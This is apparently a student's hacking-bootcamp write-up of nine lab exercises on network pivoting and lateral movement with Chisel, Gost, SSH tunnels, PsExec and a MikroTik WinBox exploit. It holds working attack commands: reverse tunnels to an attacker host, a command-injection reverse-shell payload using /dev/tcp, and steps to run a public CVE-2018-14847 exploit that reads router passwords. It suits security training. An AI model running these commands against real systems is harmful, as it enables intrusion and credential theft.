# Network Pivoting and Lateral Movement - Day 6

## Overview
This document outlines the labs completed on 08/04/2025 during the hacking bootcamp, focusing on network pivoting and lateral movement techniques in Windows and Linux environments.

## Table of Contents
- [Lab 1: Pivoting Windows Example](#lab-1-pivoting-windows-example)
- [Lab 2: Pivoting Windows Task](#lab-2-pivoting-windows-task)
- [Lab 3: Pivoting using built-in Linux capabilities Task](#lab-3-pivoting-using-built-in-linux-capabilities-task)
- [Lab 4: Pivoting Gost Task](#lab-4-pivoting-gost-task)
- [Lab 5: Pivoting Chisel Task](#lab-5-pivoting-chisel-task)
- [Lab 6: Pivoting SSH Task](#lab-6-pivoting-ssh-task)
- [Lab 7: Pivoting Chisel Example](#lab-7-pivoting-chisel-example)
- [Lab 8: Pivoting Network Pivoting](#lab-8-pivoting-network-pivoting)
- [Lab 9: Going Beyond DMZ](#lab-9-going-beyond-dmz)

## Labs

### Lab 1: Pivoting Windows Example
#### Objective
Establish a pivot through a compromised Windows machine to access an internal network.

#### Vulnerabilities
- Exposed Services: Open ports (e.g., RDP) on a compromised Windows host allow pivoting.

#### Requirements
Compromised Windows machine must be accessible with valid credentials.

#### Steps
1. **Setup**
   - Verify connectivity to the compromised Windows host.
   ```bash
   ping <WINDOWS_IP>
   ```
2. **Reconnaissance**
   - Scan for internal network hosts from the compromised machine.
   ```bash
   netscan.exe -r <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Download chisel client for windows and linux
   ```bash
   # Download and clean-up the Linux version of Chisel v1.9.1
    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
    gunzip chisel_1.9.1_linux_amd64.gz
    mv chisel_1.9.1_linux_amd64 chisel

    # Download and clean-up the Windows version of Chisel v1.9.1
    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
    gunzip chisel_1.9.1_windows_amd64.gz
    mv chisel_1.9.1_windows_amd64 chisel.exe
       ```
   - Start a listener on the attcking machine:
   ```bash
   ./chisel server --port 5000 --reverse
   ```
   - Copy the exe version to victim computer and execute it:
   ```bash
   .\chisel.exe client <ATTACKER_IP>:5000 R:8888:127.0.0.1:8000
   ``
   - Get the flag in your attacking machine from the internal network .
   ```bash
   curl localhost:8888
   ```

#### Why It Works
Compromised Windows hosts with network access allow attackers to pivot by routing traffic through them with chisel.

#### Alternatives
- Use netsh for port forwarding on Windows.

#### Resources
- [Metasploit Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

#### Notes
-   TO-DO.

---

### Lab 2: Pivoting Windows Task
#### Objective
Pivot through a Windows machine to compromise another internal host.

#### Vulnerabilities
- Weak Credentials: Reusable credentials on internal hosts enable lateral movement.

#### Requirements
Compromised Windows machine must have administrative access to another internal host.

#### Steps
1. **Setup**
   - Verify administrative access on the pivot host.
   ```bash
   net use \\<WINDOWS_IP> /user:domain\user <PASSWORD>
   ```
2. **Reconnaissance**
   - Enumerate internal hosts using PowerShell.
   ```powershell
   Get-NetComputer -Domain domain.local
   ```
3. **Exploitation**
   - Use PsExec to execute commands on the internal host.
   ```bash
   impacket-psexec domain.local/user:<PASSWORD>@<INTERNAL_IP> cmd.exe
   ```

#### Why It Works
Administrative access and weak credentials allow command execution on internal hosts via the pivot.

#### Alternatives
- Use WMI for remote command execution.

#### Resources
- [Impacket PsExec: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

#### Notes
- Verify domain credentials before attempting PsExec.

---

### Lab 3: Pivoting using built-in Linux capabilities Task
#### Objective
Pivot through a Linux machine using built-in tools to access an internal network.

#### Vulnerabilities
- Open SSH Service: SSH access on a compromised Linux host enables pivoting.

#### Requirements
Compromised Linux machine must have SSH access enabled.

#### Steps
1. **Setup**
   - Verify SSH access to the pivot host.
   ```bash
   ssh user@<LINUX_IP>
   ```
2. **Reconnaissance**
   - Scan internal network from the pivot host.
   ```bash
   nmap -sP <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Set up SSH dynamic port forwarding for pivoting.
   ```bash
   ssh -D 9050 user@<LINUX_IP>
   proxychains nmap -sT <INTERNAL_IP>
   ```

#### Why It Works
SSH’s dynamic port forwarding creates a SOCKS proxy, routing traffic through the compromised Linux host to internal networks.

#### Alternatives
- Use iptables for manual port forwarding.

#### Resources
- [SSH Tunneling Guide: https://www.ssh.com/academy/ssh/tunneling-example](https://www.ssh.com/academy/ssh/tunneling-example)

#### Notes
- Configure proxychains to use the SOCKS proxy (port 9050).

---

### Lab 4: Pivoting Gost Task
#### Objective
- Use GOST (a secure tunneling tool) on an intermediate host (10.152.152.10) to:
    - Connect to an internal FTP server (10.152.152.11).
    - Download flag.txt from an anonymous FTP service.
- Constraints:
    - SSH proxy/tunneling is blocked (e.g., -D, -L/-R flags disabled).
    - No arbitrary shell commands (restricted shell via iptables).
    - Must use a wrapper to pass arguments through SSH: `ssh -p 2222 root@10.152.152.10 -- ARGS  # ARGS = GOST command`

#### Vulnerabilities
- Exposed Services: Compromised host with network access allows Gost-based pivoting.

#### Requirements
Compromised host must be accessible and Gost installed.

#### Steps
1. **Setup**
   - Verify connectivity to the pivot host.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Identify internal network hosts.
   ```bash
   nmap -sP <INTERNAL_SUBNET>
   ```
3. **Exploitation**
   - Set up a Gost SOCKS5 proxy.
   ```bash
   gost -L=socks5://:1080 -F=<PIVOT_IP>:22
   proxychains nmap -sT <INTERNAL_IP>
   ```

#### Why It Works
Gost creates a SOCKS5 proxy through the compromised host, enabling access to internal networks.

#### Alternatives
- Use Chisel for similar SOCKS proxy pivoting.

#### Resources
- [Gost Documentation: https://github.com/ginuerzh/gost](https://github.com/ginuerzh/gost)

#### Notes
- Download and install Gost on the pivot host if needed.

---

### Lab 5: Pivoting Chisel Task
#### Objective
- Use Chisel to pivot through a compromised host to access an internal network.
- Set up a Chisel tunnel through an intermediate SSH host.
- Listen on TCP port 1337 and ensure it serves an HTTP response with a flag every minute.
- Restrictions:
    - The SSH host blocks proxy traffic (e.g., -D, -L/-R forwarding).
    - No arbitrary shell commands allowed (restricted shell via iptables).
    - Must use a wrapper to pass arguments via SSH (e.g., ssh -p 2222 root@IP -- ARGS).

#### Vulnerabilities
- Network Access: Compromised host with open ports allows Chisel-based pivoting.

#### Requirements
Compromised host must have Chisel installed and accessible.

#### Steps
1. **Setup**
   - Verify connectivity to host.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Scan the target host to discover on which port is the ssh server running (in port 2222 for our case).
   ```bash
   nmap -sP <TARGET_IP>
   ```
3. **Exploitation**
   - Set up a Chisel server on your attacking machine.
   ```bash
   chisel server -p 5000
   ```
   - Start a netcat listener on the same port `nc -nlvp 1337`
   - On another terminal, setup the chisel client on the intermediate host via an SSH wrapper
   ```bash
   ssh -p 2222 user@<TARGET_IP> -- client <ATTACKER_IP>:5000 0.0.0.0:1337:0.0.0.0:1337
   ```
   - Curl the exposed site and get the flag from the netcat listener `curl 127.0.0.1:1337`
   - The tunnel worked because chisel was made available in `/opt/chisel` in the intermediate (target) host already, and the system is configured to execute the commands in the ssh wrapper with it (chisel) by default. In the absence of the later, we could have tried: `ssh -p 2222 user@<TARGET_IP> -- ./chisel client <ATTACKER_IP>:5000 0.0.0.0:1337:0.0.0.0:1337` (specifying ./chisel from attacking machine.)
   
#### Why It Works
- Chisel’s reverse tunneling creates a SOCKS proxy, routing traffic through the compromised host to internal networks.
- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
- Reverse mode (R:): The intermediate host connects to your server, avoiding inbound firewall blocks.

#### Alternatives
- Use SSH dynamic port forwarding for pivoting.

#### Resources
- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

#### Notes
- Ensure Chisel binaries are available on both attacking machine.

---

### Lab 6: Pivoting SSH Task
#### Objective
Pivot through a compromised Linux host using SSH tunneling to access an internal network.

#### Vulnerabilities
- SSH Access: Open SSH service on a compromised host enables tunneling.

#### Requirements
Compromised Linux host must have SSH access enabled. Download and install naabu from apt, snap, or github.

#### Steps
1. **Setup**
   - Set up SSH local port forwarding and connect with ssh port forwarding your chosen port. In our case, I chose 9050.
   ```bash
   ssh -D <FORWARDING_PORT> user@<TARGET_IP> -p 2222
   ```
2. **Reconnaissance**
   - In another terminal, identify internal network hosts which are up and their ports.
   ```bash
   naabu -proxy 127.0.0.1:<FORWARDING_PORT> -port 80,8080,8000 -host 10.152.152.0/24 
   ```
   - Naabu will find an open port and host (10.152.152.93:8080).
3. **Exploitation**
   - Access the exposed internal website to get the flag.
   ```bash
   curl --socks5 127.0.0.1:9050 http://10.152.152.93:8080
   ```

#### Why It Works
- SSH local port forwarding redirects traffic through the compromised host, accessing internal services. Naabu is nmap on steroids.
- Chisel bypasses SSH restrictions by using its own encrypted tunnel.

#### Alternatives
- Use SSH dynamic port forwarding for broader network access.

#### Resources
- [SSH Tunneling Guide: https://www.ssh.com/academy/ssh/tunneling-example](https://www.ssh.com/academy/ssh/tunneling-example)
- [Naabu github: https://github.com/projectdiscovery/naabu](https://github.com/projectdiscovery/naabu)

#### Notes
- Update /etc/ssh/sshd_config to allow TCP forwarding if disabled.

---

### Lab 7: Pivoting Chisel Example
#### Objective
Demonstrate pivoting through a compromised host using Chisel to access an internal service. Lab is experimental, no solution required.

#### Vulnerabilities
- Exposed Ports: Compromised host with network access allows Chisel tunneling.

#### Requirements
Compromised host must have Chisel installed and accessible.

#### Steps
1. **Setup**

2. **Reconnaissance**

3. **Exploitation**


#### Why It Works


#### Alternatives


#### Resources
- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

#### Notes
- Test connectivity to the internal service after establishing the tunnel.
- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
- Reverse mode (R:): The intermediate host connects to your server, avoiding inbound firewall blocks.
---

### Lab 8: Network Pivoting
#### Objective
Perform network pivoting to access multiple internal subnets via a compromised host.

#### Vulnerabilities
- Network Access: Compromised host with multiple network interfaces enables pivoting.

#### Requirements
Compromised host must have access to multiple internal subnets. 

#### Steps
1. **Setup**
   - Verify connectivity to the pivot host.
   ```bash
   ping <PIVOT_IP>
   ```
2. **Reconnaissance**
   - Check web interface accessible on port 1337 or 1338.
   - Website's ping functionality allows for command injection.
   
3. **Exploitation**
   - Start a netcat listener on your attacking machine `nc -nlvp <PORT>`.
   - Ping this command on the web interface to get a reverse shell `; bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'`
   - Get the internal network IP `cat /etc/hosts/`
   - Scan the internal network subnet to find any hosts up. In our case, the internal network subnet was 172.18.0.* (172.18.0.2 was found in /etc/hosts)
   ```bash
   for ip in {1..254}; do curl --connect-timeout 1 http://172.18.0.$ip &> /dev/null && echo "172.18.0.$ip is UP" & done
   ```
   - Forward the identified internal network host with chisel (in our case, 172.18.0.3):
   - Download chisel in your attacker machine, you can find it in resources/Tools.
   ```bash
    chmod +x chisel
    ./chisel server -p 8989 --reverse
   ```
   - Server chisel over a python http server `python3 -m http.server 8000` and download it from the target machine `curl <ATTACKER-IP>:8000/chisel`
   - Start a chisel client with port forwarding:
   ```bash
   chmod +x chisel
    ./chisel client <ATTACKER-IP>:8989 R:8080:172.18.0.3:80
   ```
   - The internal website becomes accessible from your attacking machine on `127.0.0.1:80`
   - Use this [web directory wordlist](https://github.com/empty-jack/YAWR/blob/master/Web/files_and_directories/the_biggest_with_ext.txt) and find the directory containing the flag.
   ```bash
   gobuster dir -u http://127.0.0.1:80 -w wordlist.txt
   ```
#### Why It Works
- Chisel bypasses SSH restrictions by using its own encrypted tunnel.
- Reverse mode (R:): The intermediate host connects to your server, avoiding inbound firewall blocks.

#### Alternatives
- Use SSH port forwarding, or proxychains/SOCKS proxies to expose the internal website. See step by step guide in classes/day 6.

#### Resources
- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
- [Network Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

#### Notes
- TODO

---

### Lab 9: Going Beyond DMZ
#### Objective
Exploit Mikrotik router vulnerability to extract password from history of router accounts.

#### Vulnerabilities
- Mikrotik critical WinBox vulnerability (CVE-2018-14847) which allows for arbitrary file read of plain text passwords

#### Requirements
- Vm should be up and accessible.

#### Steps
1. **Setup**
   - Verify connectivity to the DMZ host.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Scan internal network from the DMZ host.
   ```bash
   nmap -sV -O <INTERNAL_SUBNET>
   ```
   - You will discover a MikroTik RouterOS device (version 6.40.7) with several exposed services including winbox on port 8291
   
3. **Exploitation**
   - Clone the the exploit from github and exploit it to get the password.
   ```bash
    git clone https://github.com/BigNerd95/WinboxExploit.git mikrotik
    cd mikrotik
    python3  WinboxExploit.py <TARGET_IP> 8291
   ```
   - Use the obtained credentials to access the Mikrotik web interface with the user admin. The password is also the flag.

#### Why It Works
The DMZ host’s access to internal networks allows attackers to tunnel traffic through it, bypassing firewall restrictions.

#### Alternatives
- You could easily bruteforce the password with ffuf and a seclist password wordlist.

#### Resources
- [Winbox Vulnerability Dissection: https://n0p.me/winbox-bug-dissection/](https://n0p.me/winbox-bug-dissection/)

#### Notes
- Ensure the DMZ host allows reverse SSH connections.

---